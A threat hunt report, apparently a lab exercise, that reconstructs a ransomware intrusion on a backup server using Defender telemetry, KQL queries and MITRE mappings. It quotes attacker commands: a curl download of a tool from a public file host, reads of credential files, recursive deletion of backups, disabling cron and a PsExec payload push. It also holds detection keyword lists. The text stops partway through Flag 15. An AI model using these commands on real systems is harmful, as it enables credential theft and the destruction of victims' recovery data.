

# 🛡️ Threat Hunt Report – Deep in the Water

---

## 📌 Executive Summary

This threat hunt investigated a full ransomware intrusion within the Azuki Logistics environment using Microsoft Defender for Endpoint telemetry. The attacker leveraged valid credentials to move laterally into backup infrastructure, conducted targeted reconnaissance, staged tooling, and systematically destroyed recovery mechanisms before deploying ransomware. The investigation revealed deliberate, hands-on attacker behavior using trusted administrative tools to maximize impact. By the time ransomware was deployed, recovery options had already been intentionally eliminated.

---

## 🎯 Hunt Objectives
- Identify and reconstruct a credential-based ransomware intrusion using Microsoft Defender for Endpoint telemetry
- Correlate attacker behaviors across discovery, lateral movement, and impact phases to MITRE ATT&CK techniques
- Document evidence, detection gaps, and response opportunities prior to ransomware deployment and recovery suppression


---

## 🧭 Scope & Environment

- **Environment:** Azuki Logistics corporate Windows and Linux environment, including user workstations and backup infrastructure  
- **Data Sources:** Microsoft Defender for Endpoint (Advanced Hunting telemetry: DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents, DeviceRegistryEvents)  
- **Timeframe:2025-11-24 → 2025-11-25**
---

## 📚 Table of Contents

- [🧠 Hunt Overview](#-hunt-overview)
- [🧬 MITRE ATT&CK Summary](#-mitre-attck-summary)
- [🔍 Flag Analysis](#-flag-analysis)
   - [🚩 Flag 1 – Lateral Movement via SSH](#-flag-1)
  - [🚩 Flag 2 – Lateral Movement Source Identification](#-flag-2)
  - [🚩 Flag 3 – Compromised Backup Administrative Account](#-flag-3)
  - [🚩 Flag 4 – Backup Directory Enumeration](#-flag-4)
  - [🚩 Flag 5 – Backup File Search (Archive Discovery)](#-flag-5)
  - [🚩 Flag 6 – Local Account Enumeration](#-flag-6)
  - [🚩 Flag 7 – Scheduled Job Reconnaissance](#-flag-7)
  - [🚩 Flag 8 – External Tool Transfer to Backup Server](#-flag-8)
  - [🚩 Flag 9 – Credential Harvesting from Backup Configuration](#-flag-9)
  - [🚩 Flag 10 – Backup Data Destruction](#-flag-10)
  - [🚩 Flag 11 – Backup Scheduling Service Stopped](#-flag-11)
  - [🚩 Flag 12 – Backup Scheduling Service Disabled](#-flag-12)
  - [🚩 Flag 13 – Remote Execution Using PsExec](#-flag-13)
  - [🚩 Flag 14 – Payload Deployment via PsExec](#-flag-14)
  - [🚩 Flag 15 – Malicious Payload Execution](#-flag-15)
  - [🚩 Flag 16 – Volume Shadow Copy Service Stopped](#-flag-16)
  - [🚩 Flag 17 – Windows Backup Engine Stopped](#-flag-17)
  - [🚩 Flag 18 – Forced Termination of Database Service](#-flag-18)
  - [🚩 Flag 19 – Volume Shadow Copy Deletion](#-flag-19)
  - [🚩 Flag 21 – Windows Recovery Environment Disabled](#-flag-21)
  - [🚩 Flag 22 – Backup Catalog Deletion](#-flag-22)
  - [🚩 Flag 23 – Registry Autorun Persistence Established](#-flag-23)
  - [🚩 Flag 24 – Scheduled Task Persistence Established](#-flag-24)
  - [🚩 Flag 25 – NTFS USN Journal Deletion](#-flag-25)
  - [🚩 Flag 26 – Ransom Note Creation](#-flag-26)
- [🚨 Detection Gaps & Recommendations](#-detection-gaps--recommendations)
- [🧾 Final Assessment](#-final-assessment)
- [📎 Analyst Notes](#-analyst-notes)

---

## 🧠 Hunt Overview

This hunt traces the final phase of a credential-based ransomware attack from lateral movement into backup infrastructure through discovery, credential abuse, tool transfer, recovery suppression, and impact. The attacker demonstrated clear knowledge of the environment, prioritizing backup systems and recovery mechanisms to ensure encryption would be irreversible. Rather than relying on exploits, the intrusion abused legitimate credentials and native system utilities, allowing malicious activity to blend into normal administrative behavior. This hunt highlights how low-noise actions, when correlated, reveal a complete ransomware kill chain and expose critical detection gaps prior to impact.

---

## 🧬 MITRE ATT&CK Summary

| Flag | Technique Category | MITRE ID | Priority |
|-----:|-------------------|----------|----------|
| 1 | Lateral Movement – Remote Services (SSH) | T1021.004 | High |
| 2 | Lateral Movement – Source Attribution | T1021 | Medium |
| 3 | Credential Access – Valid Accounts | T1078.002 | High |
| 4 | Discovery – File and Directory Discovery | T1083 | High |
| 5 | Discovery – File Search | T1083 | Medium |
| 6 | Discovery – Account Discovery | T1087 | Medium |
| 7 | Discovery – Scheduled Task/Job Discovery | T1053.003 | Medium |
| 8 | Command and Control – Ingress Tool Transfer | T1105 | High |
| 9 | Credential Access – Credentials from Password Stores | T1555 | High |
| 10 | Impact – Data Destruction | T1485 | Critical |
| 11 | Impact – Service Stop | T1489 | High |
| 12 | Impact – Modify System Services | T1543 | High |
| 13 | Lateral Movement – Remote Execution | T1021.002 | High |
| 14 | Lateral Movement – Remote Execution (PsExec) | T1021 | High |
| 15 | Execution – Malicious Payload Execution | T1059 | Critical |
| 16 | Impact – Inhibit System Recovery | T1490 | Critical |
| 17 | Impact – Inhibit System Recovery | T1490 | Critical |
| 18 | Defense Evasion – Process Termination | T1489 | High |
| 19 | Impact – Inhibit System Recovery | T1490 | Critical |
| 20 | Impact – Inhibit System Recovery (Storage Limitation) | T1490 | Critical |
| 21 | Impact – Inhibit System Recovery (Recovery Disabled) | T1490 | Critical |
| 22 | Impact – Inhibit System Recovery (Backup Catalog Deletion) | T1490 | Critical |
| 23 | Persistence – Registry Run Keys / Startup Folder | T1547.001 | High |
| 24 | Persistence – Scheduled Task/Job | T1053.005 | High |
| 25 | Defense Evasion – Indicator Removal on Host | T1070 | High |
| 26 | Impact – Data Encrypted for Impact (Ransom Note) | T1486 | Critical |

---

## 🔍 Flag Analysis

_All flags below are collapsible for readability._

---

<details>
<summary id="-flag-1">🚩 <strong>Flag 1: LATERAL MOVEMENT - Remote Access</strong></summary>

### 🎯 Objective
Attackers pivot to critical infrastructure to eliminate recovery options before deploying ransomware.

### 📌 Finding
"ssh.exe" backup-admin@10.1.0.189

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z|
| Process | ssh.exe |
| Parent Process | Unknown |
| Command Line | "ssh.exe" backup-admin@10.1.0.189 |

### 💡 Why it matters
This activity maps directly to **MITRE ATT&CK – TA0008: Lateral Movement**, specifically **T1021.004: Remote Services – SSH**. Adversaries who obtain valid credentials frequently use SSH to move laterally within internal networks because it is trusted, encrypted, and often poorly monitored. 

In ransomware and destructive intrusion campaigns, attackers deliberately pivot to backup servers and administrative systems via SSH to disable recovery mechanisms, exfiltrate credentials, or stage payloads prior to impact. Detection of unexpected SSH-based lateral movement is therefore critical for identifying hands-on-keyboard activity during the pre-encryption phase of an attack.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where Timestamp between (startofday(datetime(2025-11-25)) .. endofday(datetime(2025-11-25)))
| where RemotePort == 22
| project TimeGenerated, DeviceName, InitiatingProcessCommandLine, RemoteIP
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/07e3e411-a88c-4d39-8fdf-d33cb6159e5c" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
Baseline which hosts and user accounts are authorized to initiate SSH sessions to internal systems. Alert on new or rare SSH connections originating from user workstations, especially when targeting backup servers, domain controllers, or other high-value infrastructure, and correlate with credential use, privilege escalation, and subsequent destructive activity.

</details>

---

<details>
<summary id="-flag-2">🚩 <strong>Flag 2: LATERAL MOVEMENT - Attack Source</strong></summary>

### 🎯 Objective
Identifying the attack source enables network segmentation and containment.

References:

T1021.004: Remote Services - SSH

### 📌 Finding
10.1.0.108

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z|


### 💡 Why it matters
This activity maps directly to **MITRE ATT&CK – TA0008: Lateral Movement**, specifically **T1021.004: Remote Services – SSH**. Adversaries who obtain valid credentials frequently use SSH to move laterally within internal networks because it is trusted, encrypted, and often poorly monitored. 

In ransomware and destructive intrusion campaigns, attackers deliberately pivot to backup servers and administrative systems via SSH to disable recovery mechanisms, exfiltrate credentials, or stage payloads prior to impact. Detection of unexpected SSH-based lateral movement is therefore critical for identifying hands-on-keyboard activity during the pre-encryption phase of an attack.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"
| where RemotePort == 22
| project LocalIP
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/20f6a686-3287-4d7b-b34e-2e9461ba72a6" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
When investigating lateral movement, always pivot on the source host and local IP address to anchor attacker activity. Use the identified source system to review process execution, authentication events, and outbound network connections around the same timestamp to determine whether the workstation is an initial foothold or a secondary pivot point. Confirm whether this host routinely initiates remote access sessions or if the behavior is anomalous, and prioritize containment of the source system to prevent further lateral spread.

</details>

---
<details>
<summary id="-flag-3">🚩 <strong>Flag 3: CREDENTIAL ACCESS - Compromised Account</strong></summary>

### 🎯 Objective
Administrative accounts with backup privileges provide access to critical recovery infrastructure.

### 📌 Finding
backup-admin

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-adminpc |
| Timestamp | 2025-11-25T05:39:11.0836084Z |
| Process | SSH.exe |
| Command Line | "ssh.exe" backup-admin@10.1.0.189 |

### 💡 Why it matters
This activity aligns with Valid Accounts – Domain Accounts (MITRE ATT&CK T1078.002), where adversaries use legitimate credentials rather than exploiting vulnerabilities. The use of a backup-related administrative account indicates the attacker has already bypassed preventive controls and is operating with trusted access. Compromise of such accounts is especially dangerous because they provide direct access to recovery infrastructure, enabling attackers to disable backups, move laterally with minimal resistance, and significantly increase the impact of ransomware or destructive attacks.

### 🔧 KQL Query Used
```
DeviceNetworkEvents
| where TimeGenerated == datetime(2025-11-25T05:39:11.0836084Z)
| where DeviceName == "azuki-adminpc"
| where RemotePort == 22
| project TimeGenerated, InitiatingProcessCommandLine
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/fd4a74e2-9d71-46d3-a14b-ed5f8fc2d22c" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Identify administrative or service accounts that are used interactively (SSH, RDP) rather than through automated services. Baseline expected usage of backup and recovery accounts, and alert when they are observed initiating remote sessions from user workstations or accessing systems outside their normal scope. Correlate account usage with privilege level, time of day, and lateral movement patterns to detect credential compromise early.

</details>

---
<details>
<summary id="-flag-4">🚩 <strong>Flag 4: DISCOVERY - Directory Enumeration</strong></summary>

### 🎯 Objective
File system enumeration reveals backup locations and valuable targets for destruction.

### 📌 Finding
ls --color=auto -la /backups/

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:51.749736Z |
| Process | ls |
| Parent Process | bash |
| Command Line | ls --color=auto -la /backups/ |

### 💡 Why it matters
This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), where adversaries enumerate the file system to identify high-value data and infrastructure components. Enumerating the /backups/ directory on a backup server indicates the attacker is actively identifying recovery data that could later be deleted, encrypted, or otherwise rendered unusable. 

When this behavior follows lateral movement into backup infrastructure, it strongly suggests preparation for impact rather than routine administration, and represents one of the final reconnaissance steps before destructive actions.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-25T05:39:11Z) .. datetime(2025-11-25T06:30:00Z))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ("ls ", "dir ", "find ")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/d70344ba-e0fb-4a3c-81ff-02e862430f69" />

### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive enumeration commands (e.g., ls, find, dir) executed on backup servers, especially when initiated shortly after new remote access sessions. Baseline normal administrative activity on backup infrastructure and alert when file listing or discovery commands target known backup directories outside of routine maintenance windows, as this often precedes destructive actions.

</details>

---
<details>
<summary id="-flag-5">🚩 <strong>Flag 5: DISCOVERY - File Search</strong></summary>

### 🎯 Objective
Attackers search for specific file types to identify high-value targets.

### 📌 Finding
find /backups -name *.tar.gz

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-24T14:16:06.546964Z |
| Process | find |
| Parent Process | bash |
| Command Line | find /backups -name *.tar.gz |

### 💡 Why it matters
This activity aligns with File and Directory Discovery (MITRE ATT&CK T1083), where adversaries search for specific file types to locate high-value data. By targeting compressed backup archives (*.tar.gz) within the /backups directory, the attacker is narrowing in on data that is most valuable for recovery or extortion. 

This indicates focused reconnaissance rather than broad exploration, suggesting the attacker is identifying precise targets for deletion or encryption as part of a planned impact phase.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (startofday(datetime(2025-11-24)) .. endofday(datetime(2025-11-26)))
| where DeviceName has "azuki-backupsrv"
| where AccountName has "" "backup-admin"
| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/402f92cd-6e21-4259-bd2d-a75532694f06" />




### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for targeted file search commands such as find executed against backup directories, especially when filtering for archive or backup-related extensions (e.g., .tar.gz, .zip, .bak). These searches are rarely part of routine administration and often indicate attackers are identifying specific data for destruction or exfiltration. Correlate file search activity with prior remote access, directory enumeration, and privileged account usage to detect attacks progressing toward impact.

</details>

---
<details>
<summary id="-flag-6">🚩 <strong>Flag 6: DISCOVERY - Account Enumeration</strong></summary>

### 🎯 Objective
Attackers enumerate local accounts to understand the system's user base.

### 📌 Finding
cat /etc/passwd

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-24T14:16:08.673485Z |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /etc/passwd |

### 💡 Why it matters
This activity aligns with Account Discovery (MITRE ATT&CK T1087), where adversaries enumerate local accounts to understand which identities exist on a system. Reading /etc/passwd allows an attacker to identify human users, service accounts, login shells, and potential privilege boundaries. 

On a backup server, this reconnaissance helps the attacker determine which accounts may be leveraged for privilege escalation, credential reuse, or broader lateral movement before executing impact actions.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where ProcessCommandLine has_any ("passwd", "/etc/passwd", "getent", "id", "lslogins")
| project DeviceName, AccountName, TimeGenerated, FileName, ProcessCommandLine, InitiatingProcessCommandLine
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/725a3c5c-57f6-438e-a132-85ba5eb2d125" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive access to local account databases such as /etc/passwd, /etc/shadow, or account enumeration utilities (getent, id, lslogins) on backup and infrastructure servers. These actions are uncommon outside of troubleshooting or audits and should be correlated with recent remote access sessions and elevated account usage. Prioritize investigation when account enumeration occurs shortly after lateral movement, as it often precedes privilege escalation or destructive activity.

</details>

---
<details>
<summary id="-flag-7">🚩 <strong>Flag 7: DISCOVERY - Scheduled Job Reconnaissance</strong></summary>

### 🎯 Objective
Understanding backup schedules helps attackers time their destruction for maximum impact.

### 📌 Finding
cat /etc/crontab

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | <Placeholder> |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /etc/crontab |

### 💡 Why it matters
This activity aligns with Scheduled Task/Job Discovery (MITRE ATT&CK T1053.003 – Cron), where adversaries inspect scheduled jobs to understand automated system behavior. By reviewing /etc/crontab, the attacker can identify backup schedules, maintenance tasks, and privileged jobs that may be disabled, hijacked, or timed to coincide with destructive actions. 

On a backup server, this reconnaissance helps attackers determine when backups run and how to maximize impact while minimizing detection.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has "/etc/crontab"
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/f29cac68-ada0-4c82-86c8-2e9b155a9042" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for interactive access to cron configuration files such as /etc/crontab and /etc/cron* on backup and infrastructure servers. These files are rarely accessed outside of maintenance or troubleshooting and should be correlated with recent remote access and discovery activity. 

Prioritize investigation when scheduled job reconnaissance occurs alongside backup enumeration, as attackers often use this information to time or disable recovery mechanisms before impact.

</details>

---
<details>
<summary id="-flag-8">🚩 <strong>Flag 8: COMMAND AND CONTROL - Tool Transfer</strong></summary>

### 🎯 Objective
Attackers download tools from external infrastructure to carry out the attack.

### 📌 Finding
curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:45:34.259149Z |
| Process | curl |
| Parent Process | bash |
| Command Line | curl -L -o destroy.7z https://litter.catbox.moe/io523y.7z |

### 💡 Why it matters
This activity aligns with Ingress Tool Transfer (MITRE ATT&CK T1105), where adversaries introduce external tools into the environment to enable later stages of the attack. Backup servers rarely require outbound downloads from public hosting services, making this behavior highly anomalous. When observed after lateral movement and reconnaissance, ingress tool transfer strongly indicates the attacker is transitioning from discovery to impact, leaving limited time for defenders to intervene.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ("wget ", "curl ", "scp ", "ftp ")
| project TimeGenerated, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img alt="image" src="https://github.com/user-attachments/assets/593d2b34-e280-49e6-b557-baf7b711f0f7" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor critical infrastructure systems, especially backup servers, for interactive use of file transfer utilities such as curl or wget making outbound connections to external hosts. Pay particular attention to downloads originating from public file-hosting services, as these are commonly used to stage tools immediately before destructive actions. Correlate tool transfer activity with prior remote access and reconnaissance to identify attacks approaching the impact phase.

</details>

---
<details>
<summary id="-flag-9">🚩 <strong>Flag 9: CREDENTIAL ACCESS - Credential Theft</strong></summary>

### 🎯 Objective
Backup servers often store sensitive configuration files containing credentials.

### 📌 Finding
cat /backups/configs/all-credentials.txt

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net> |
| Timestamp | 2025-11-24T14:14:14.217788Z |
| Process | cat |
| Parent Process | bash |
| Command Line | cat /backups/configs/all-credentials.txt |

### 💡 Why it matters
This activity aligns with Credentials from Password Stores (MITRE ATT&CK T1555). Accessing a file explicitly named to contain credentials indicates the attacker is harvesting secrets rather than merely enumerating the system. On a backup server, exposed credentials often grant access to additional infrastructure, significantly expanding attacker reach and accelerating progression toward full environment compromise.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where TimeGenerated between (datetime(2025-11-23) .. datetime(2025-11-27))
| where DeviceName has "azuki-backupsrv"
| where ProcessCommandLine has_any ( "password"  "passwd", "credential", "credentials", "cred", "secret","secrets",  "token", "key", "keys",".key" , ".pem", ".pfx", ".pgpass", ".env",".conf", "/etc/passwd","/etc/shadow", "/etc/bacula",".ssh", "id_rsa", "authorized_keys")
| project TimeGenerated, DeviceName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/f7c7f0c8-29df-4296-9ea0-c0244d501705" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on interactive access to files containing credential-related keywords (e.g., credentials, secrets, .env, .conf) on backup and infrastructure servers. Correlate with prior discovery and lateral movement to identify credential theft occurring late in the intrusion.

</details>

---
<details>
<summary id="-flag-10">🚩 <strong>Flag 10: IMPACT - Data Destruction</strong></summary>

### 🎯 Objective
Destroying backups eliminates recovery options and maximises ransomware impact.

### 📌 Finding
rm -rf /backups/archives

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:02.660493Z |
| Process | rm |
| Parent Process | bash |
| Command Line | rm -rf /backups/archives |

### 💡 Why it matters
This activity aligns with Data Destruction (MITRE ATT&CK T1485), where adversaries deliberately delete data to prevent system recovery and maximize operational impact. The use of a recursive deletion command against backup directories indicates intentional destruction of recovery data rather than routine maintenance. 

Once backup data is removed, defenders lose the ability to restore affected systems, significantly increasing the success and leverage of ransomware or destructive attacks.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "rm -f",
    "rm -rf",
    "unlink ",
    "xargs rm",
    "find / -exec rm",
    "shred ",
    "dd if=",
    "dd of=",
    "truncate ",
    "/var/backups",
    "/backups",
    "/etc/bacula",
    "/var/lib/bacula",
    ".tar",
    ".tar.gz",
    ".zip",
    ".bak",
    "chmod 000",
    "chattr -i",
    "chattr +i"
)
| project TimeGenerated, DeviceName, AccountName, InitiatingProcessCommandLine, ProcessCommandLine
| order by TimeGenerated asc
```
### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/dbfb1c47-1b97-4488-a808-6c01a7e6f247" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for recursive file deletion commands such as rm -rf executed on backup or recovery systems, particularly when targeting known backup directories. These actions are rarely legitimate and should be treated as high-severity events requiring immediate response. Correlate deletion activity with prior remote access, reconnaissance, and tool transfer to identify attacks that have reached the impact stage.

</details>

---
<details>
<summary id="-flag-11">🚩 <strong>Flag 11: IMPACT - Service Stopped</strong></summary>

### 🎯 Objective
Stopping services takes effect immediately but does NOT survive a reboot.
Disrupt scheduled system activity to interfere with backups and system maintenance.

### 📌 Finding
systemctl stop cron

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:03.659261Z |
| Process | systemctl |
| Parent Process | bash |
| Command Line | systemctl stop cron |

### 💡 Why it matters
This aligns with Service Stop (MITRE ATT&CK T1489). Stopping the cron service prevents scheduled jobs such as backups, monitoring, or cleanup tasks from running. In ransomware attacks, this is commonly used to halt backup operations and reduce the chance of recovery or detection.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "systemctl stop",  "service ",  "service stop",  "pkill ",  "kill ",  "killall ",    "sv stop",  "rc-service",  "chkconfig", "initctl stop")
| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/a810a6a7-5439-49df-92ee-2b72a0199b0d" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for systemctl or service stop commands on critical infrastructure. Treat service stoppage on backup servers as high-severity, especially when it follows discovery or destructive activity.

</details>

---
<details>
<summary id="-flag-12">🚩 <strong>Flag 12: IMPACT - Service Disabled</strong></summary>

### 🎯 Objective
Permanently prevent scheduled services from restarting after reboot. Disabling a service prevents it from starting at boot - this SURVIVES a reboot.

### 📌 Finding
systemctl disable cron

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T05:47:03.679621Z |
| Process | systemctl |
| Parent Process | bash |
| Command Line | systemctl disable cron |

### 💡 Why it matters
This aligns with Service Stop / Modify System Services (MITRE ATT&CK T1489 / T1543). Disabling cron ensures backup and maintenance jobs do not resume, extending the impact beyond the current session and increasing operational disruption.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki-backupsrv"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z) .. datetime(2025-11-25T23:59:59Z))
| where ProcessCommandLine has_any (
    "systemctl stop",
    "systemctl disable",
    "systemctl mask",
    "service stop",
    "initctl stop",
    "rc-service stop",
    "update-rc.d",
    "chkconfig off",
    "pkill ",
    "killall "
)
| project TimeGenerated, AccountName, ProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/5e7b7af1-8366-40d4-a462-e500cede2d13" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert when system services are disabled on backup or infrastructure servers. Prioritize incidents where service disablement follows service stoppage or backup deletion.

</details>

---
<details>
<summary id="-flag-13">🚩 <strong>Flag 13: LATERAL MOVEMENT - Remote Execution</strong></summary>

### 🎯 Objective
Execute commands remotely on additional systems using administrative access. Remote administration tools enable attackers to deploy malware across multiple systems simultaneously.

### 📌 Finding
PsExec64.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | PsExec64.exe |
| Parent Process | cmd.exe or powershell.exe  |
| Command Line | PsExec64.exe |

### 💡 Why it matters
This aligns with Remote Services: SMB/Windows Admin Shares (MITRE ATT&CK T1021.002). PsExec is a legitimate administrative tool frequently abused by attackers to move laterally and execute payloads across multiple hosts quickly.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| where FileName endswith ".exe"
| where ProcessCommandLine has_any ("\\\\","ADMIN$","IPC$","C$","schtasks","wmic","sc ","psexec","PSEXESVC","at.exe","/node:","process call create")
| summarize DeviceCount=dcount(DeviceName), Devices=make_set(DeviceName) by FileName, ProcessCommandLine
| order by DeviceCount desc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/31256178-6e74-4119-b55b-350553e2e248" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
Monitor for PsExec execution across multiple hosts, especially outside of approved admin tooling paths. Correlate with credential compromise and prior impact actions.

</details>

---
<details>
<summary id="-flag-14">🚩 <strong>Flag 14: LATERAL MOVEMENT - Deployment Command</strong></summary>

### 🎯 Objective
Full command lines reveal target systems, credentials, and deployed payloads.

References:

T1021.002: SMB/Windows Admin Shares

### 📌 Finding
"PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | PsExec64.exe |
| Parent Process | Likely cmd.exe or powershell.exe |
| Command Line | "PsExec64.exe" \\10.1.0.102 -u kenji.sato -p ********** -c -f C:\Windows\Temp\cache\silentlynx.exe |

### 💡 Why it matters
This aligns with Remote Execution (MITRE ATT&CK T1021). Using PsExec with explicit credentials to copy and execute a binary shows coordinated lateral deployment of malicious tooling.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where FileName =~ "PsExec64.exe"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img alt="image" src="https://github.com/user-attachments/assets/4b5ea642-da6b-40ce-bfdd-0e627412beb2" />



### 🛠️ Detection Recommendation

**Hunting Tip:**  
Alert on PsExec commands that include credential arguments and file copy flags. These are rarely used in modern admin workflows and often indicate malicious lateral deployment.

</details>

---
<details>
<summary id="-flag-15">🚩 <strong>Flag 15: EXECUTION - Malicious Payload</strong></summary>

### 🎯 Objective
Execute malicious payload to carry out encryption or destructive actions. Identifying the payload enables threat hunting across the environment

### 📌 Finding
silentlynx.exe

### 🔍 Evidence

| Field | Value |
|------|-------|
| Host | azuki-backupsrv.zi5bvzlx0idetcyt0okhu05hda.cx.internal.cloudapp.net |
| Timestamp | 2025-11-25T06:03:47.900164Z |
| Process | silentlynx.exe |
| Parent Process | PsExec64.exe |
| Command Line | silentlynx.exe |

### 💡 Why it matters
This aligns with User Execution / Malicious File Execution (MITRE ATT&CK T1204 / T1059). Execution of a non-standard binary deployed via PsExec strongly indicates attacker-controlled payload execution as part of the impact phase.

### 🔧 KQL Query Used
```
DeviceProcessEvents
| where DeviceName has "azuki"
| where FileName =~ "PsExec64.exe"
| where TimeGenerated between (datetime(2025-11-25T00:00:00Z)..datetime(2025-11-25T23:59:59Z))
| project TimeGenerated, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessCommandLine
| order by TimeGenerated asc
```

### 🖼️ Screenshot
<img  alt="image" src="https://github.com/user-attachments/assets/0468e85a-ee82-4274-837e-4ee30a29a3b5" />


### 🛠️ Detection Recommendation

**Hunting Tip:**  
